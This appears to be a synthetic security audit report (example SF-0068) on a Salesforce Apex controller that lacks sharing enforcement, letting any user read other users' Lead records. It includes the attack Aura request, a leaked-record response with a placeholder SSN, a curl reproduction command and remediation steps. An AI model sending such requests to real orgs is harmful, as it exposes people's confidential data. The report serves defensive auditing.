# Security Analysis Report
**System:** SkyPort Global Distribution (Salesforce-Integrated)
**Domain:** Travel / Global Distribution System
**Example ID:** SF-0068
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `LeadController.getLeadData` — attacker reads any travel distribution Lead record without server-side ownership check |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Lead Object (Pattern 3.1)

### Summary
The Apex controller `LeadController` on SkyPort Global Distribution (`86e3f634.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `leadId` values it legitimately owns (client-assumed authority). No server-side ownership or tenancy check is enforced, allowing the attacker to read any victim Lead record.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` while the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://86e3f634.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://86e3f634.lightning.force.com/aura
Authorization: Bearer 00D86E3F634!AR86e3f634...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D86E3F634!AR86e3f634...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"001F634","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001F634", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-38-9467"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D86E3F634!AR86e3f634..."
curl -s -X POST "https://86e3f634.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001F634","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-38-9467
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. Do not trust client-supplied `leadId` — always verify ownership server-side.
